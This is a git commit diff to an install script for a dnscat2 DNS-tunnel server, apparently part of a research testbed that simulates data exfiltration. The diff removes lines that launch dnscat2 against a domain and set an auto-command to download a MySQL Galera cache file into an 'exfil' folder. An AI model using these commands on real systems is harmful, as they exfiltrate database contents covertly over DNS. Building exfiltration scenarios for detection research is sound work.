42782800f624c3009f1503c8af954d38c07ce982
fretbuzz <jseverin@andrew.cmu.edu>
2019-04-05 14:18:57 -0400

    about to test dnscat installation

--- experiment_coordinator/dnscat_component/install_dnscat_server.sh
+++ experiment_coordinator/dnscat_component/install_dnscat_server.sh
@@ -7,7 +7,3 @@ apt-get install ruby-dev
 apt-get install gem
 gem install bundler
 bundle install
-ruby ./dnscat2.rb cheddar.org
-set passthrough=8.8.8.8:53
-set auto_command=download /var/lib/mysql/galera.cache ./exfil; delay 5
-window -i dns1
